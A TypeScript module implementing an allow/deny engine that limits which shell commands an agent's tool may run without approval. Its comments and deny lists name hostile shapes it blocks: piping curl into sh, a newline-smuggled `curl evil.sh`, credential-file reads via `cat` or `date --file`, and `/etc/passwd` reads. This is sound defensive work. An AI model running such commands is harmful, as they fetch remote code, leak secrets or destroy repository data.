/**
 * The command-scope engine: which *invocations* of a shell tool may run
 * unattended.
 *
 * `ToolRisk` classifies a tool. That is too coarse for a shell, whose calls
 * range from `git status` to `curl … | sh`, so this narrows a `gated` tool
 * one call at a time — a base command plus the argument shapes that keep it
 * read-only, never a bare executable and never a whole command string.
 *
 * Parsing is deliberately dumb, and that is the design rather than a
 * shortcut: tokenize, take the base command, scan for control operators.
 * Anything ambiguous is "not safe", so the failure mode of a parser that
 * disagrees with `sh` is a prompt somebody has to answer, not a command
 * nobody vetted.
 */

/** One narrow permission to run a command: what, and in which forms. */
export interface CommandScope {
  /** The base command, matched exactly — never a path (`/bin/git` is not `git`). */
  command: string;
  /** Literal arguments that must follow it, in order (`['push']`). */
  args?: string[];
  /**
   * Long flags (`--force`) and short letters (`f`) that disqualify a match.
   * Short letters are checked inside bundles, so `-fdx` trips on `f`.
   */
  deniedFlags?: string[];
  /** Literal arguments that disqualify a match anywhere after `args`. */
  deniedArgs?: string[];
  /**
   * Refuse *any* argument that is not a flag.
   *
   * The listing forms of `git branch` and `git tag` are the safe ones, and
   * what separates them from the creating forms is a positional: `git
   * branch` lists, `git branch release` creates. Excluding flags is not
   * enough there, because creation needs none.
   */
  listOnly?: boolean;
  /**
   * The only flags this scope permits. Present, it replaces "anything not
   * denied" with "nothing but these" — which is the direction to fail in
   * for a command whose flags can mutate: `git branch --unset-upstream`
   * changes repository config, takes no positional, and is not a delete or
   * a force, so a deny list has to have thought of it and an allow list
   * does not.
   *
   * Long flags match by name, so `--sort=-committerdate` is `--sort`.
   * Short flags match per letter inside a bundle, and digits are ignored
   * because they are arguments rather than flags (`git tag -n5`).
   */
  allowedFlags?: string[];
  /**
   * Refuse `:branch` and `+branch` arguments. Git's refspec syntax makes
   * those a delete and a forced update *without any flag*, so a scope that
   * only excluded flags would let `git push origin :main` through as an
   * ordinary push.
   */
  denyRefspecForms?: boolean;
  /**
   * At most this many positional arguments, where `listOnly` allows none.
   * `grep` reads its pattern from the first positional and a *file* from
   * every one after it, so a `grep` that may only filter what is piped to
   * it is a `grep` with one.
   */
  maxPositionals?: number;
  /**
   * Flags whose value is the next token (`-n 20`), so that token is read
   * as the flag's value rather than counted as a positional. Matched as
   * the token is spelled, whole: `-n` takes a value, a bundle like `-vn`
   * does not, and its next token counts as a positional.
   */
  flagsWithValue?: string[];
  /**
   * Refuse any token the shell would expand: an unquoted glob, brace,
   * `~`, `$`, or backslash. A filter limited to one positional is only
   * limited to one if the shell agrees — unquoted `grep *` is `grep`
   * handed every file in the directory, the first as its pattern and the
   * rest to read.
   */
  literal?: boolean;
}

/**
 * Flags that turn something else into a program, a network peer, or a file
 * write — and are therefore refused in every scope, safe-listed or
 * persisted. `git -c core.pager=…` and `git diff --no-index /etc/passwd`
 * are the reason: both are read-only commands by name.
 */
const ALWAYS_DENIED_FLAGS = [
  '-c',
  '--config',
  '--config-env',
  '--exec',
  '--exec-path',
  '--upload-pack',
  '--receive-pack',
  '--ext-diff',
  '--no-index',
  '--output',
  '--open-files-in-pager',
  // Reads a path the scope never mentioned. `date --file=…/credentials.json`
  // is not a date lookup; it is a file read whose contents come back in the
  // error text, from a command whose name says otherwise.
  '--file',
];

/**
 * What a persisted scope excludes, whatever it was approved for. Approving
 * `git push origin main` must not persist a permission that covers
 * `git push --force` — the point of storing a scope rather than a command
 * string is to be useful next time, and the point of storing a scope rather
 * than the bare executable is that it still says no to this.
 */
const DESTRUCTIVE_FLAGS = [
  '--force',
  '--force-with-lease',
  '--force-if-includes',
  '--delete',
  '--prune',
  '--mirror',
  '--hard',
  '--no-verify',
  'f',
  'd',
  'D',
];

/**
 * The commands that run unattended out of the box.
 *
 * Short on purpose. Every entry is a promise that no argument shape reaches
 * outside the repository it is run in, and the tempting additions —
 * `cat`, `ls`, `grep` — cannot make it: they read whatever path they are
 * given, and `cat ~/.stratus/credentials.json` is a safe-listed credential
 * read. An operator who wants those adds them deliberately, or approves
 * them once and keeps the scope.
 *
 * The test is *what an argument can make the command do*, not what the
 * command is called. `date` was on this list until someone pointed out
 * `date --file=~/.stratus/credentials.json`, which is not a date lookup:
 * GNU `date` reads that file and echoes each unparseable line back in its
 * error text, which the shell tool returns. A command that can be handed a
 * path is a file reader wearing another name.
 */
/**
 * An `allowedFlags` entry admitting a flag that is only a number, the way
 * `head -20` spells `head -n 20`. Not a letter, so no bundle can spell it.
 */
export const NUMERIC_FLAG = '-<number>';

export const SAFE_COMMAND_SCOPES: CommandScope[] = [
  { command: 'git', args: ['status'] },
  { command: 'git', args: ['log'] },
  { command: 'git', args: ['diff'] },
  { command: 'git', args: ['show'] },
  { command: 'git', args: ['blame'] },
  { command: 'git', args: ['describe'] },
  { command: 'git', args: ['rev-parse'] },
  { command: 'git', args: ['ls-files'] },
  { command: 'git', args: ['shortlog'] },
  // Listing branches, tags, and remotes is read-only. Creating one needs no
  // flag at all — `git branch release` is a mutation and `git branch` is
  // not — so these are list-only, and every other form asks.
  {
    command: 'git',
    args: ['branch'],
    listOnly: true,
    // Named rather than excluded: `git branch` has flag-only mutations
    // (`--unset-upstream`, `-u origin/main`) that no list of destructive
    // *shapes* would have caught, so this scope covers the listing flags
    // and nothing else.
    allowedFlags: [
      '--list', '--all', '--remotes', '--show-current', '--verbose', '--no-verbose',
      '--color', '--no-color', '--column', '--no-column', '--sort', '--format',
      '--contains', '--no-contains', '--merged', '--no-merged', '--points-at',
      '--ignore-case', '--omit-empty', '--abbrev', '--no-abbrev',
      'l', 'a', 'r', 'v', 'i', 'q',
    ],
    deniedFlags: ['--delete', '--move', '--copy', '--force', 'd', 'D', 'm', 'M', 'C', 'u'],
  },
  {
    command: 'git',
    args: ['tag'],
    listOnly: true,
    allowedFlags: [
      '--list', '--contains', '--no-contains', '--merged', '--no-merged', '--points-at',
      '--sort', '--format', '--color', '--no-color', '--column', '--no-column',
      '--ignore-case', '--omit-empty',
      'l', 'n', 'i',
    ],
    deniedFlags: ['--delete', '--force', 'd', 'f'],
  },
  {
    command: 'git',
    args: ['remote'],
    listOnly: true,
    allowedFlags: ['--verbose', 'v'],
    deniedArgs: ['add', 'remove', 'rm', 'rename', 'set-url', 'set-head', 'set-branches', 'prune', 'update'],
  },
  // Filters: what they read is stdin, which is what makes them safe at the
  // end of a pipeline whose first command is. Each is held to its listing
  // shape, a named set of flags, and no token the shell would expand, so
  // none of them can be handed a path: `tail -n 50 log` asks, and
  // `git log | tail -n 50` does not. `grep` keeps its one positional, the
  // pattern, and not `-e`, `-f`, or `-r`, each of which would turn the next
  // positional or the directory into something it reads. No `c` letter in
  // any of them: `-c` is refused in every scope for `git -c`'s sake, so
  // the counting forms are spelled long (`uniq --count`, `wc --bytes`).
  {
    command: 'grep',
    maxPositionals: 1,
    literal: true,
    allowedFlags: [
      '--ignore-case', '--invert-match', '--line-number', '--count', '--word-regexp', '--line-regexp',
      '--only-matching', '--extended-regexp', '--fixed-strings', '--basic-regexp', '--max-count',
      '--after-context', '--before-context', '--context', '--color', '--colour', '--quiet', '--silent',
      '--no-messages',
      'i', 'v', 'n', 'w', 'x', 'o', 'E', 'F', 'G', 'm', 'A', 'B', 'C', 'q', 's',
    ],
    flagsWithValue: ['-m', '-A', '-B', '-C', '--max-count', '--after-context', '--before-context', '--context'],
  },
  {
    command: 'head',
    listOnly: true,
    literal: true,
    allowedFlags: ['--lines', '--bytes', '--quiet', '--silent', 'n', 'q', NUMERIC_FLAG],
    flagsWithValue: ['-n', '--lines', '--bytes'],
  },
  {
    command: 'tail',
    listOnly: true,
    literal: true,
    allowedFlags: ['--lines', '--bytes', '--quiet', '--silent', 'n', 'q', 'r', NUMERIC_FLAG],
    flagsWithValue: ['-n', '--lines', '--bytes'],
  },
  {
    command: 'wc',
    listOnly: true,
    literal: true,
    allowedFlags: ['--lines', '--words', '--bytes', '--chars', 'l', 'w', 'm'],
  },
  {
    command: 'sort',
    listOnly: true,
    literal: true,
    // Not `-o`, which writes a file, nor `--compress-program`, which runs one.
    allowedFlags: [
      '--reverse', '--numeric-sort', '--unique', '--ignore-case', '--human-numeric-sort', '--version-sort',
      '--stable', '--key', '--field-separator',
      'r', 'n', 'u', 'f', 'h', 'V', 's', 'k', 't',
    ],
    flagsWithValue: ['-k', '-t', '--key', '--field-separator'],
  },
  {
    command: 'uniq',
    listOnly: true,
    literal: true,
    // `uniq in out` writes `out`; listOnly is what refuses that.
    allowedFlags: ['--count', '--repeated', '--unique', '--ignore-case', 'd', 'u', 'i'],
  },
  { command: 'pwd' },
  { command: 'whoami' },
  { command: 'uname' },
];

/**
 * Every shell control operator, as a rejection set rather than a blacklist
 * of the memorable ones. A single `&` backgrounds a command as surely as
 * `&&` chains one, and a newline runs the next line whatever came before
 * it — an enumerated list is exactly how `git status\ncurl evil.sh` gets
 * auto-approved.
 */
const CONTROL_OPERATORS: Array<{ pattern: RegExp; name: string }> = [
  { pattern: /\$\(/, name: 'command substitution ($( ))' },
  { pattern: /`/, name: 'command substitution (backticks)' },
  { pattern: /\|/, name: 'a pipe (|)' },
  { pattern: /&/, name: 'an ampersand (& or &&)' },
  { pattern: /;/, name: 'a semicolon (;)' },
  { pattern: /[\r\n]/, name: 'a newline' },
  { pattern: /[()]/, name: 'a subshell (parentheses)' },
  { pattern: /[<>]/, name: 'a redirection (< or >)' },
  { pattern: /\$\{/, name: 'a parameter expansion (${ })' },
];

export interface CommandAnalysis {
  /** The command as written, for messages and prompts. */
  command: string;
  /** The base command, absent when the string could not be tokenized or is a pipeline. */
  base?: string;
  tokens: string[];
  /**
   * Per token, whether the shell would expand it (an unquoted glob, brace,
   * `~`, `$`, or backslash). Absent reads as "nothing expands", which only
   * a scope marked `literal` consults.
   */
  expands?: boolean[];
  /**
   * The commands of a pipeline (`a | b`), each analyzed on its own. Present,
   * the invocation is covered only when every one of them is.
   */
  pipeline?: CommandAnalysis[];
  /**
   * Why this invocation cannot be auto-approved at all — a control
   * operator, an unbalanced quote, an absolute path. Undefined means it is
   * a candidate for scope matching, not that it is allowed.
   */
  disqualifiedBy?: string;
}

const EXPANDING = /[*?[\]{}~$\\]/;

const tokenize = (command: string): { tokens: string[]; expands: boolean[] } | undefined => {
  const tokens: string[] = [];
  const expands: boolean[] = [];
  let current = '';
  let quote: '"' | "'" | undefined;
  let started = false;
  let expanding = false;

  for (const char of command) {
    if (quote) {
      if (char === quote) {
        quote = undefined;
      } else {
        current += char;
      }
      continue;
    }
    if (char === '"' || char === "'") {
      quote = char;
      started = true;
      continue;
    }
    if (char === ' ' || char === '\t') {
      if (started) {
        tokens.push(current);
        expands.push(expanding);
        current = '';
        started = false;
        expanding = false;
      }
      continue;
    }
    if (EXPANDING.test(char)) {
      expanding = true;
    }
    current += char;
    started = true;
  }
  if (quote) {
    // An unbalanced quote means this parser and the shell disagree about
    // where the command ends. There is no safe reading of that.
    return undefined;
  }
  if (started) {
    tokens.push(current);
    expands.push(expanding);
  }
  return { tokens, expands };
};

/**
 * Split on the pipes the shell would split on: outside quotes, and never
 * `||`, which is a conditional rather than a pipe. Undefined when there is
 * no reading of the string that this parser and `sh` would agree on.
 */
const splitPipeline = (command: string): string[] | undefined => {
  const segments: string[] = [];
  let current = '';
  let quote: '"' | "'" | undefined;
  for (const char of command) {
    if (quote) {
      if (char === quote) {
        quote = undefined;
      }
      current += char;
      continue;
    }
    if (char === '"' || char === "'") {
      quote = char;
    } else if (char === '|') {
      segments.push(current);
      current = '';
      continue;
    }
    current += char;
  }
  if (quote) {
    return undefined;
  }
  segments.push(current);
  return segments;
};

/** Read a command string as far as it can be read safely. */
export const analyzeCommand = (command: string): CommandAnalysis => {
  const segments = splitPipeline(command);
  if (segments && segments.length > 1) {
    return analyzePipeline(command, segments);
  }
  return analyzeSimple(command);
};

/**
 * A pipeline is judged command by command, and nothing about it is
 * trusted that would not be trusted of its parts. Every other control
 * operator still disqualifies the whole: `||` and `|&` included, since
 * the first is a conditional and the second pipes stderr. A backslash
 * anywhere does too, because `\|` is a literal to `sh` and a split here,
 * and a parser that splits where the shell does not is judging commands
 * nobody runs.
 */
const analyzePipeline = (command: string, segments: string[]): CommandAnalysis => {
  if (command.includes('\\')) {
    return { command, tokens: [], disqualifiedBy: 'it pipes a command containing a backslash' };
  }
  const pipeline: CommandAnalysis[] = [];
  for (const segment of segments) {
    if (segment.trim().length === 0) {
      return { command, tokens: [], disqualifiedBy: 'it contains an empty pipeline stage (|| or a stray |)' };
    }
    const analysis = analyzeSimple(segment.trim());
    if (analysis.disqualifiedBy) {
      return { command, tokens: [], disqualifiedBy: analysis.disqualifiedBy };
    }
    pipeline.push(analysis);
  }
  return { command, tokens: [], pipeline };
};

const analyzeSimple = (command: string): CommandAnalysis => {
  for (const operator of CONTROL_OPERATORS) {
    if (operator.pattern.test(command)) {
      return { command, tokens: [], disqualifiedBy: `it contains ${operator.name}` };
    }
  }

  const read = tokenize(command);
  if (!read || read.tokens.length === 0) {
    return { command, tokens: [], disqualifiedBy: 'it could not be read as a command' };
  }
  const { tokens, expands } = read;

  const base = tokens[0] as string;
  if (base.includes('/') || base.includes('\\')) {
    // A scope names a command, and `/usr/bin/git` is not that name. Refusing
    // beats resolving: `./git` in a cloned repository is a different program
    // with the same basename.
    return { command, tokens, expands, disqualifiedBy: 'it names a path rather than a command' };
  }
  if (base.startsWith('-') || base.includes('=')) {
    // `FOO=bar cmd` is an environment assignment, which is the shell's job
    // and not this parser's.
    return { command, tokens, expands, disqualifiedBy: 'it does not start with a command' };
  }

  return { command, base, tokens, expands };
};

const flagsOf = (token: string): { long?: string; shorts: string[] } => {
  if (token.startsWith('--')) {
    const [name] = token.split('=');
    return { long: name ?? token, shorts: [] };
  }
  if (token.startsWith('-') && token.length > 1) {
    const [bundle] = token.slice(1).split('=');
    return { shorts: [...(bundle ?? '')] };
  }
  return { shorts: [] };
};

const deniesFlag = (denied: string[], token: string): boolean => {
  // The token as written, minus any `=value`, so a deny list can name a
  // short flag whole (`-c`) as well as by its letter — `git -c` is the
  // entry `ALWAYS_DENIED_FLAGS` was written for, and letter-by-letter
  // matching alone never reached it.
  const [spelled] = token.split('=');
  if (spelled !== undefined && denied.includes(spelled)) {
    return true;
  }
  const { long, shorts } = flagsOf(token);
  if (long && denied.includes(long)) {
    return true;
  }
  return shorts.some((letter) => denied.includes(letter));
};

/** Whether every part of a flag token is on an allowlist. */
const allowsFlag = (allowed: string[], token: string): boolean => {
  const { long, shorts } = flagsOf(token);
  if (long) {
    return allowed.includes(long);
  }
  const letters = shorts.filter((letter) => !/[0-9]/.test(letter));
  if (letters.length === 0) {
    return shorts.length > 0 && allowed.includes(NUMERIC_FLAG);
  }
  return letters.every((letter) => allowed.includes(letter));
};

/** Whether an invocation falls inside one scope. */
export const matchesScope = (analysis: CommandAnalysis, scope: CommandScope): boolean => {
  if (analysis.disqualifiedBy || analysis.base === undefined) {
    return false;
  }
  if (analysis.base !== scope.command) {
    return false;
  }

  const args = analysis.tokens.slice(1);
  const required = scope.args ?? [];
  if (args.length < required.length) {
    return false;
  }
  for (const [index, expected] of required.entries()) {
    if (args[index] !== expected) {
      return false;
    }
  }

  const denied = [...ALWAYS_DENIED_FLAGS, ...(scope.deniedFlags ?? [])];
  // A required token can itself be a flag or a refspec — an exact scope
  // carries the whole approved command — and a whitelist file is
  // hand-editable, so the prefix is held to the same rules as the rest.
  for (const token of args.slice(0, required.length)) {
    if (token.startsWith('-')) {
      if (deniesFlag(denied, token)) {
        return false;
      }
      continue;
    }
    if (scope.deniedArgs?.includes(token)) {
      return false;
    }
    if (scope.denyRefspecForms && (token.startsWith(':') || token.startsWith('+'))) {
      return false;
    }
  }
  if (scope.literal && analysis.expands?.some((expands) => expands)) {
    return false;
  }
  const rest = args.slice(required.length);
  let positionals = 0;
  for (let index = 0; index < rest.length; index += 1) {
    const token = rest[index] as string;
    if (token.startsWith('-')) {
      if (deniesFlag(denied, token)) {
        return false;
      }
      if (scope.allowedFlags && !allowsFlag(scope.allowedFlags, token)) {
        return false;
      }
      if (scope.flagsWithValue?.includes(token)) {
        if (index + 1 >= rest.length) {
          return false;
        }
        index += 1;
      }
      continue;
    }
    if (scope.listOnly) {
      return false;
    }
    positionals += 1;
    if (scope.maxPositionals !== undefined && positionals > scope.maxPositionals) {
      return false;
    }
    if (scope.deniedArgs?.includes(token)) {
      return false;
    }
    if (scope.denyRefspecForms && (token.startsWith(':') || token.startsWith('+'))) {
      return false;
    }
  }
  return true;
};

/**
 * The scopes covering an invocation, one per command of a pipeline and one
 * for a plain command, or undefined unless every command is covered.
 */
export const findCoveringScopes = (
  analysis: CommandAnalysis,
  scopes: readonly CommandScope[],
): CommandScope[] | undefined => {
  const commands = analysis.pipeline ?? [analysis];
  const covering: CommandScope[] = [];
  for (const command of commands) {
    const scope = findMatchingScope(command, scopes);
    if (!scope) {
      return undefined;
    }
    covering.push(scope);
  }
  return covering;
};

/** The first scope covering this invocation, if any covers it. */
export const findMatchingScope = (
  analysis: CommandAnalysis,
  scopes: readonly CommandScope[],
): CommandScope | undefined => scopes.find((scope) => matchesScope(analysis, scope));

/**
 * The scope an "always allow" persists.
 *
 * Base command plus its first literal argument — `git push`, not
 * `git push origin main` (too narrow to be worth storing) and not `git`
 * (too broad to be safe) — carrying the destructive-form constraints that
 * make the distinction real, and inheriting anything the safe list already
 * excludes for the same command so a persisted scope can never erase a
 * flag distinction the built-in list draws.
 *
 * Any flags standing between the command and that argument are part of the
 * scope too: `mkdir -p build` persists `mkdir -p build`. `matchesScope`
 * reads `args` as the invocation's leading tokens, so a scope that skipped
 * over `-p` to reach `build` could never match the command it was approved
 * for — every later `mkdir -p …` asked again, under a log line promising it
 * would not.
 *
 * A flag-first scope is the approved command exactly, though — every token
 * in order, and nothing more or less. Nothing here knows which flags take a
 * separate value, so in `git --git-dir /x status` the first positional is
 * `/x`, not `status`: a scope of `git --git-dir /x` with a free subcommand
 * behind it would have approved every git command against that repository
 * on the strength of one `status`, and a scope that let trailing flags vary
 * would have let `git -C repo branch --list` cover `--unset-upstream`, since
 * the subcommand whose constraints should apply cannot be found. Exactness
 * costs a prompt for `cp -r src elsewhere` after `cp -r src dist` was
 * approved, which is the direction to fail in.
 *
 * And the command must be one the engine could ever run unattended: a
 * destructive flag, one the safe list excludes for this base command (any
 * subcommand's, since which one applies is unknowable), one that turns
 * something else into a program, or a refspec form means there is no scope
 * to store — "always" on `git --no-pager push origin :main` must not turn a
 * branch delete into something that runs without asking — and the answer
 * counts once.
 */
export const normalizeCommandScope = (analysis: CommandAnalysis): CommandScope | undefined => {
  if (analysis.disqualifiedBy || analysis.base === undefined) {
    return undefined;
  }
  const tokens = analysis.tokens.slice(1);
  const firstIndex = tokens.findIndex((token) => !token.startsWith('-'));
  const first = firstIndex === -1 ? undefined : tokens[firstIndex];
  const refspecs = analysis.base === 'git';

  if (firstIndex !== 0 && tokens.length > 0) {
    // Flag-first: the exact command, held to every constraint the safe
    // list draws for this base command, because the subcommand that would
    // pick between them cannot be identified past a flag of unknown arity.
    const forBase = SAFE_COMMAND_SCOPES.filter((scope) => scope.command === analysis.base);
    const denied = [...ALWAYS_DENIED_FLAGS, ...DESTRUCTIVE_FLAGS, ...forBase.flatMap((scope) => scope.deniedFlags ?? [])];
    const deniedArgs = forBase.flatMap((scope) => scope.deniedArgs ?? []);
    for (const token of tokens) {
      if (token.startsWith('-') ? deniesFlag(denied, token) : deniedArgs.includes(token)) {
        return undefined;
      }
      if (refspecs && !token.startsWith('-') && (token.startsWith(':') || token.startsWith('+'))) {
        return undefined;
      }
      // Nor anything the shell reads differently quoted and unquoted.
      // Tokens are stored unquoted, so `chmod -R 600 'file*'` and
      // `chmod -R 600 file*` are one scope to this engine and two commands
      // to `sh -c` — one touches a file named file*, the other every file
      // that matches — and `mkdir -p safe # other` and `mkdir -p safe '#'
      // other` are one scope and two commands the other way round, since
      // an unquoted `#` ends the command the shell runs. The characters are
      // refused rather than the quoting remembered, since a scope that ran
      // unattended on how a command was spelled would be a new kind of
      // rule; the cost is a prompt each time for a URL with a `?` or a
      // `find` with a pattern.
      if (/[*?[\]{}~$\\#]/.test(token)) {
        return undefined;
      }
    }
    // The positive constraints too. A safe scope that says what its
    // subcommand may do — `git branch` is list-only, with the listing
    // flags named — applies wherever that subcommand stands among the
    // tokens, or `git --no-pager branch release` would persist the branch
    // creation that `git branch release` never does. Which token is the
    // subcommand is still unknowable in general; a name that turns out to
    // be some flag's value costs a prompt, never a grant.
    for (const scope of forBase) {
      const subcommand = scope.args ?? [];
      if (subcommand.length === 0 || (!scope.listOnly && !scope.allowedFlags)) {
        continue;
      }
      const at = tokens.findIndex((token, index) =>
        !token.startsWith('-') && subcommand.every((part, offset) => tokens[index + offset] === part));
      if (at === -1) {
        continue;
      }
      for (const token of tokens.slice(at + subcommand.length)) {
        if (token.startsWith('-') ? scope.allowedFlags !== undefined && !allowsFlag(scope.allowedFlags, token) : scope.listOnly) {
          return undefined;
        }
      }
    }
    return {
      command: analysis.base,
      args: [...tokens],
      deniedFlags: [...new Set([...DESTRUCTIVE_FLAGS, ...forBase.flatMap((scope) => scope.deniedFlags ?? [])])],
      ...(deniedArgs.length > 0 ? { deniedArgs: [...new Set(deniedArgs)] } : {}),
      // Nothing beyond the command as approved: no positional, no flag.
      listOnly: true,
      allowedFlags: [],
      ...(refspecs ? { denyRefspecForms: true } : {}),
    };
  }

  const sameScope = SAFE_COMMAND_SCOPES
    .filter((scope) => scope.command === analysis.base && (scope.args ?? []).join(' ') === (first ?? ''));
  const inherited = sameScope.flatMap((scope) => scope.deniedFlags ?? []);
  const args = first === undefined ? [] : [first];
  const deniedArgs = sameScope.flatMap((scope) => scope.deniedArgs ?? []);
  // Only when every safe scope for this command names one: a persisted
  // scope must be no wider than the built-in, and an allowlist from one of
  // two scopes would narrow the other by accident.
  const allowedFlags = sameScope.length > 0 && sameScope.every((scope) => scope.allowedFlags)
    ? [...new Set(sameScope.flatMap((scope) => scope.allowedFlags ?? []))]
    : undefined;

  return {
    command: analysis.base,
    ...(args.length > 0 ? { args } : {}),
    deniedFlags: [...new Set([...DESTRUCTIVE_FLAGS, ...inherited])],
    ...(deniedArgs.length > 0 ? { deniedArgs: [...new Set(deniedArgs)] } : {}),
    // A persisted scope cannot be wider than the safe list's own for the
    // same command: approving `git branch` once must not turn creating a
    // branch into something that runs unattended forever after.
    ...(sameScope.some((scope) => scope.listOnly) ? { listOnly: true } : {}),
    ...(allowedFlags ? { allowedFlags } : {}),
    // Git's syntax, so git's rule: elsewhere a leading `+` is an ordinary
    // argument (`chmod +x`) and refusing it would only cost a prompt for no
    // safety.
    ...(refspecs ? { denyRefspecForms: true } : {}),
  };
};

/**
 * The scope an operator declares in config (`approvals.commands`): a
 * command and, optionally, the subcommands it is limited to — `agentboard`,
 * `pnpm test`, `gh pr`. Whatever follows the prefix may vary, the way a
 * remembered scope's arguments do, and the same things stay refused: the
 * destructive flags, whatever the built-in list refuses for that command,
 * and git's refspec deletes.
 *
 * Only words. A flag, an operator, or a token the shell would expand has no
 * meaning as a prefix, and guessing one would be a grant nobody wrote, so
 * the entry is refused with the reason instead.
 */
export const commandScopeFromPrefix = (prefix: string): { scope: CommandScope } | { reason: string } => {
  const analysis = analyzeCommand(prefix.trim());
  if (analysis.pipeline) {
    return { reason: 'it is a pipeline; list each command on its own' };
  }
  if (analysis.disqualifiedBy || analysis.base === undefined) {
    return { reason: analysis.disqualifiedBy ?? 'it could not be read as a command' };
  }
  const args = analysis.tokens.slice(1);
  if (args.some((token) => token.startsWith('-'))) {
    return { reason: 'it names a flag; list the command and its subcommands only' };
  }
  if (analysis.expands?.some((expands) => expands) || analysis.tokens.some((token) => /[*?[\]{}~$\\#]/.test(token))) {
    return { reason: 'it contains something the shell would expand' };
  }
  const forBase = SAFE_COMMAND_SCOPES.filter((scope) => scope.command === analysis.base);
  const declared = args.join(' ');
  // A prefix shorter than a subcommand the built-in list limits would cover
  // that subcommand's mutating forms: `git` would run `git branch release`,
  // which the list's own `git branch` scope exists to refuse.
  const narrower = forBase.find((scope) => {
    const sub = scope.args ?? [];
    return sub.length > args.length
      && args.every((token, index) => sub[index] === token)
      && (scope.listOnly || scope.allowedFlags || scope.maxPositionals !== undefined);
  });
  if (narrower) {
    return { reason: `the built-in list limits \`${describeCommandScope(narrower)}\`; list the subcommands it may run instead` };
  }
  // Nor longer than a limited built-in scope: `grep fix` names grep's
  // pattern, and as a prefix it would let any file follow it, which the
  // built-in `grep` exists to refuse. The limits are about the arguments a
  // prefix fixes in place, so there is no adjusting them; the entry is
  // refused and the built-in scope already covers what it was safe for.
  const extended = forBase.find((scope) => {
    const sub = scope.args ?? [];
    return sub.length < args.length
      && sub.every((token, index) => args[index] === token)
      && (scope.listOnly || scope.allowedFlags || scope.maxPositionals !== undefined || scope.literal || (scope.flagsWithValue ?? []).length > 0);
  });
  if (extended) {
    return { reason: `it extends \`${describeCommandScope(extended)}\`, which the built-in list already limits; it runs unattended within those limits without an entry` };
  }
  // And the same prefix as a built-in scope keeps every limit it draws —
  // list-only, the named flags, the positional count — never just the
  // refusals: `git branch` must still not create a branch.
  const same = forBase.filter((scope) => (scope.args ?? []).join(' ') === declared);
  const allowedFlags = same.length > 0 && same.every((scope) => scope.allowedFlags)
    ? [...new Set(same.flatMap((scope) => scope.allowedFlags ?? []))]
    : undefined;
  const flagsWithValue = [...new Set(same.flatMap((scope) => scope.flagsWithValue ?? []))];
  const positionals = same.map((scope) => scope.maxPositionals).filter((count): count is number => count !== undefined);
  // Refusals come only from built-in scopes on the same path as this one:
  // `git remote` refuses `add` as its argument, which says nothing about
  // `git add`, and copying it would refuse the entry's own subcommand.
  const related = forBase.filter((scope) => {
    const sub = scope.args ?? [];
    const shorter = sub.length <= args.length ? sub : args;
    const longer = sub.length <= args.length ? args : sub;
    return shorter.every((token, index) => longer[index] === token);
  });
  const deniedArgs = related.flatMap((scope) => scope.deniedArgs ?? []);
  return {
    scope: {
      command: analysis.base,
      ...(args.length > 0 ? { args } : {}),
      deniedFlags: [...new Set([...DESTRUCTIVE_FLAGS, ...related.flatMap((scope) => scope.deniedFlags ?? [])])],
      ...(deniedArgs.length > 0 ? { deniedArgs: [...new Set(deniedArgs)] } : {}),
      ...(same.some((scope) => scope.listOnly) ? { listOnly: true } : {}),
      ...(allowedFlags ? { allowedFlags } : {}),
      ...(flagsWithValue.length > 0 ? { flagsWithValue } : {}),
      ...(positionals.length > 0 ? { maxPositionals: Math.min(...positionals) } : {}),
      ...(same.some((scope) => scope.literal) ? { literal: true } : {}),
      ...(analysis.base === 'git' ? { denyRefspecForms: true } : {}),
    },
  };
};

/** One line an operator can read in a log or a whitelist listing. */
export const describeCommandScope = (scope: CommandScope): string =>
  [scope.command, ...(scope.args ?? [])].join(' ');

/** Whether two scopes permit the same thing, so a whitelist does not grow duplicates. */
export const sameScope = (left: CommandScope, right: CommandScope): boolean =>
  JSON.stringify(normalizeForCompare(left)) === JSON.stringify(normalizeForCompare(right));

const normalizeForCompare = (scope: CommandScope) => ({
  command: scope.command,
  args: scope.args ?? [],
  deniedFlags: [...(scope.deniedFlags ?? [])].sort(),
  deniedArgs: [...(scope.deniedArgs ?? [])].sort(),
  denyRefspecForms: scope.denyRefspecForms ?? false,
  listOnly: scope.listOnly ?? false,
  allowedFlags: [...(scope.allowedFlags ?? [])].sort(),
  maxPositionals: scope.maxPositionals ?? null,
  flagsWithValue: [...(scope.flagsWithValue ?? [])].sort(),
  literal: scope.literal ?? false,
});

/** Read one scope out of a whitelist file, or refuse it. */
export const parseCommandScope = (raw: unknown): CommandScope | undefined => {
  if (typeof raw !== 'object' || raw === null || Array.isArray(raw)) {
    return undefined;
  }
  const source = raw as Record<string, unknown>;
  if (typeof source.command !== 'string' || source.command.length === 0) {
    return undefined;
  }
  const strings = (value: unknown): string[] | undefined =>
    Array.isArray(value) && value.every((entry) => typeof entry === 'string') ? (value as string[]) : undefined;

  const args = strings(source.args);
  const deniedFlags = strings(source.deniedFlags);
  const deniedArgs = strings(source.deniedArgs);
  const allowedFlags = strings(source.allowedFlags);
  const flagsWithValue = strings(source.flagsWithValue);
  const maxPositionals = typeof source.maxPositionals === 'number'
    && Number.isInteger(source.maxPositionals) && source.maxPositionals >= 0
    ? source.maxPositionals
    : undefined;
  return {
    command: source.command,
    ...(args ? { args } : {}),
    ...(deniedFlags ? { deniedFlags } : {}),
    ...(deniedArgs ? { deniedArgs } : {}),
    ...(source.denyRefspecForms === true ? { denyRefspecForms: true } : {}),
    ...(source.listOnly === true ? { listOnly: true } : {}),
    ...(allowedFlags ? { allowedFlags } : {}),
    ...(maxPositionals !== undefined ? { maxPositionals } : {}),
    ...(flagsWithValue ? { flagsWithValue } : {}),
    ...(source.literal === true ? { literal: true } : {}),
  };
};
